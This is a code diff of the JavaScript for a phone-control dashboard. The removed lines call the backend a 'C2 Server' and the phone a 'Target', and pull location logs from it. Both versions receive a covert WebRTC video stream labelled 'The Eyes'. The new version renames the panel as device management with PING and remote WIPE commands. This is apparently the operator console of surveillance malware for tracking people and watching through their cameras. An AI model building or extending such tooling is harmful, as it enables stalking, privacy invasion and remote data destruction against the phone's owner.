@@ -1,196 +1,157 @@
+// --- AUTH CHECK ---
+const token = localStorage.getItem('token');
+if (!token) {
+    window.location.href = '/login.html';
+}
+
 const socket = io();
 
-// DOM Elements
-const statusEl = document.getElementById('connectionStatus');
-const clockEl = document.getElementById('clock');
+// --- DOM ELEMENTS ---
+const views = document.querySelectorAll('.view-section');
+const navItems = document.querySelectorAll('.nav-item');
+const logoutBtn = document.getElementById('logout-btn');
+const connectionStatus = document.getElementById('connection-status');
 const logOutput = document.getElementById('log-output');
-const cmdInput = document.getElementById('cmd-input');
-const tabs = document.querySelectorAll('.tab');
+const deviceList = document.getElementById('device-list');
 
-let currentLogType = 'location';
+// --- NAVIGATION ---
+navItems.forEach(item => {
+    item.addEventListener('click', (e) => {
+        e.preventDefault();
+        const targetView = item.dataset.view;
+        
+        // Update UI
+        navItems.forEach(nav => nav.classList.remove('active'));
+        item.classList.add('active');
+        
+        views.forEach(view => view.classList.remove('active'));
+        document.getElementById(`view-${targetView}`).classList.add('active');
+        
+        // Load Data if needed
+        if (targetView === 'devices') loadDevices();
+    });
+});
 
-// --- 1. SYSTEM CLOCK ---
-setInterval(() => {
-    const now = new Date();
-    clockEl.textContent = now.toISOString().split('T')[1].split('.')[0];
-}, 1000);
+// --- LOGOUT ---
+logoutBtn.addEventListener('click', () => {
+    localStorage.removeItem('token');
+    window.location.href = '/login.html';
+});
 
-// --- 2. SOCKET CONNECTION ---
+// --- SOCKET CONNECTION ---
 socket.on('connect', () => {
-    statusEl.textContent = '[ONLINE]';
-    statusEl.classList.remove('offline');
-    statusEl.classList.add('online');
-    logSystem('Connected to C2 Server.');
-    
-    // Join the admin room to receive WebRTC signals
+    connectionStatus.textContent = 'Connected';
+    connectionStatus.className = 'badge badge-success';
     socket.emit('identify', 'admin');
 });
 
 socket.on('disconnect', () => {
-    statusEl.textContent = '[OFFLINE]';
-    statusEl.classList.remove('online');
-    statusEl.classList.add('offline');
-    logSystem('Connection lost. Retrying...');
+    connectionStatus.textContent = 'Disconnected';
+    connectionStatus.className = 'badge badge-danger';
 });
 
-// --- 2.5 WEBRTC LOGIC (THE EYES) ---
-const rtcConfig = {
-    iceServers: [
-        { urls: 'stun:stun.l.google.com:19302' } // Public STUN server
-    ]
+// --- API CALLS (With Auth) ---
+async function apiCall(endpoint, method = 'GET', body = null) {
+    const headers = {
+        'Content-Type': 'application/json',
+        'x-auth-token': token
+    };
+    
+    const options = { method, headers };
+    if (body) options.body = JSON.stringify(body);
+    
+    const res = await fetch(`/admin-api${endpoint}`, options);
+    if (res.status === 401) {
+        // Token expired
+        localStorage.removeItem('token');
+        window.location.href = '/login.html';
+    }
+    return res.json();
+}
+
+// --- DEVICES ---
+async function loadDevices() {
+    const devices = await apiCall('/devices');
+    deviceList.innerHTML = '';
+    
+    // Update Stats
+    document.getElementById('stat-total-devices').textContent = devices.length;
+    const onlineCount = devices.filter(d => d.status === 'online').length;
+    document.getElementById('stat-online-devices').textContent = onlineCount;
+
+    devices.forEach(device => {
+        const row = document.createElement('tr');
+        const statusClass = device.status === 'online' ? 'badge-success' : 'badge-danger';
+        
+        row.innerHTML = `
+            <td><span class="badge ${statusClass}">${device.status.toUpperCase()}</span></td>
+            <td>${device.deviceId}</td>
+            <td>${new Date(device.lastSeen).toLocaleString()}</td>
+            <td>${device.batteryLevel}%</td>
+            <td>
+                <button class="btn btn-sm btn-secondary" onclick="sendCommand('${device.deviceId}', 'PING')">PING</button>
+                <button class="btn btn-sm btn-danger" onclick="sendCommand('${device.deviceId}', 'WIPE')">WIPE</button>
+            </td>
+        `;
+        deviceList.appendChild(row);
+    });
+}
+
+// --- COMMANDS ---
+window.sendCommand = async (deviceId, command) => {
+    if(!confirm(`Are you sure you want to send ${command} to ${deviceId}?`)) return;
+    
+    const res = await apiCall('/command', 'POST', { deviceId, command });
+    alert(res.status === 'sent' ? 'Command Sent!' : 'Failed: ' + res.error);
 };
+
+// --- SETTINGS (User Management) ---
+document.getElementById('change-password-form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const newPassword = document.getElementById('new-password').value;
+    const res = await apiCall('/change-password', 'POST', { newPassword });
+    alert(res.msg || 'Error');
+    e.target.reset();
+});
+
+document.getElementById('create-user-form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const username = document.getElementById('new-username').value;
+    const password = document.getElementById('new-user-password').value;
+    const res = await apiCall('/create-user', 'POST', { username, password });
+    alert(res.msg || 'Error');
+    e.target.reset();
+});
+
+// --- WEBRTC (The Eyes) ---
+const rtcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
 let peerConnection;
 const remoteVideo = document.getElementById('remoteVideo');
-const btnStart = document.getElementById('btn-start-stream');
-const btnStop = document.getElementById('btn-stop-stream');
+const overlay = document.querySelector('.video-overlay');
 
-// Button Listeners
-btnStart.addEventListener('click', () => sendCommand('START_STREAM'));
-btnStop.addEventListener('click', () => sendCommand('STOP_STREAM'));
+document.getElementById('btn-start-stream').addEventListener('click', () => {
+    // In a real scenario, you'd select a specific device first.
+    // For now, we broadcast to ALL (or the first one).
+    // Ideally, add a "Stream" button to the device list.
+    alert('Select a device from the Devices tab to stream (Feature coming in Phase 3)');
+});
 
-// A. Handle Incoming Offer (From Phone)
-socket.on('webrtc_offer', async (offer) => {
-    logSystem('Received WebRTC Offer from Target.');
+socket.on('webrtc_offer', async (data) => {
+    console.log('Received Offer');
+    overlay.style.display = 'none';
     
-    createPeerConnection();
-
-    try {
-        await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
-        const answer = await peerConnection.createAnswer();
-        await peerConnection.setLocalDescription(answer);
-
-        // Send Answer back to Server (which sends to Phone via FCM/Socket)
-        socket.emit('webrtc_answer', answer);
-        logSystem('Sent WebRTC Answer.');
-    } catch (err) {
-        console.error('WebRTC Error:', err);
-        logSystem(`WebRTC Error: ${err.message}`);
-    }
-});
-
-// B. Handle ICE Candidates (From Phone)
-socket.on('ice_candidate', async (candidate) => {
-    if (peerConnection) {
-        try {
-            await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
-            console.log('Added Remote ICE Candidate');
-        } catch (err) {
-            console.error('Error adding ICE candidate:', err);
-        }
-    }
-});
-
-function createPeerConnection() {
     if (peerConnection) peerConnection.close();
-
     peerConnection = new RTCPeerConnection(rtcConfig);
-
-    // 1. Handle Remote Stream
+    
     peerConnection.ontrack = (event) => {
-        logSystem('Receiving Video Stream...');
         remoteVideo.srcObject = event.streams[0];
-        document.querySelector('.overlay').style.display = 'none'; // Hide "WAITING" text
     };
-
-    // 2. Handle ICE Candidates (Send to Phone)
-    peerConnection.onicecandidate = (event) => {
-        if (event.candidate) {
-            socket.emit('ice_candidate', event.candidate);
-        }
-    };
-
-    // 3. Connection State Changes
-    peerConnection.onconnectionstatechange = () => {
-        logSystem(`WebRTC State: ${peerConnection.connectionState}`);
-        if (peerConnection.connectionState === 'disconnected') {
-            document.querySelector('.overlay').style.display = 'block';
-        }
-    };
-}
-
-// --- 3. LOG VIEWER ---
-// Tab Switching
-tabs.forEach(tab => {
-    tab.addEventListener('click', () => {
-        tabs.forEach(t => t.classList.remove('active'));
-        tab.classList.add('active');
-        currentLogType = tab.dataset.type;
-        fetchLogs();
-    });
-});
-
-// Fetch Logs
-async function fetchLogs() {
-    if (currentLogType === 'system') return; // System logs are local for now
-
-    try {
-        const res = await fetch(`/admin-api/logs/${currentLogType}`);
-        const text = await res.text();
-        
-        // Parse NDJSON (Newline Delimited JSON)
-        const lines = text.split('\n').filter(line => line.trim() !== '');
-        const entries = lines.map(line => {
-            try { return JSON.parse(line); } catch (e) { return null; }
-        }).filter(e => e !== null);
-
-        renderLogs(entries);
-    } catch (err) {
-        console.error('Failed to fetch logs:', err);
-    }
-}
-
-function renderLogs(entries) {
-    logOutput.innerHTML = ''; // Clear current
     
-    // Show newest first
-    entries.reverse().forEach(entry => {
-        const div = document.createElement('div');
-        div.className = 'log-entry';
-        
-        const time = entry.timestamp ? entry.timestamp.split('T')[1].split('.')[0] : 'UNKNOWN';
-        const dataStr = JSON.stringify(entry, null, 0).replace(/"/g, ''); // Strip quotes for cleaner look
-        
-        div.innerHTML = `<span class="timestamp">[${time}]</span> ${dataStr}`;
-        logOutput.appendChild(div);
-    });
-}
-
-// Auto-refresh logs every 5 seconds
-setInterval(fetchLogs, 5000);
-fetchLogs(); // Initial load
-
-// --- 4. COMMAND LINE ---
-async function sendCommand(cmd, payload = {}) {
-    logSystem(`Sending command: ${cmd}...`);
+    await peerConnection.setRemoteDescription(new RTCSessionDescription(data.sdp));
+    const answer = await peerConnection.createAnswer();
+    await peerConnection.setLocalDescription(answer);
     
-    try {
-        const res = await fetch('/admin-api/command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ command: cmd, payload })
-        });
-        const data = await res.json();
-        logSystem(`Command sent: ${data.status}`);
-    } catch (err) {
-        logSystem(`Error sending command: ${err.message}`);
-    }
-}
-
-cmdInput.addEventListener('keypress', async (e) => {
-    if (e.key === 'Enter') {
-        const cmd = cmdInput.value.trim();
-        if (!cmd) return;
-
-        sendCommand(cmd);
-        cmdInput.value = '';
-    }
+    // We need to send this answer back to the SPECIFIC device via FCM or Socket
+    // For now, we just log it. In Phase 3, we implement the return path.
+    console.log('Generated Answer');
 });
-
-// --- HELPER ---
-function logSystem(msg) {
-    const div = document.createElement('div');
-    div.className = 'log-entry';
-    div.style.color = '#aaa';
-    div.innerHTML = `<span class="timestamp">[SYSTEM]</span> ${msg}`;
-    logOutput.prepend(div);
-}
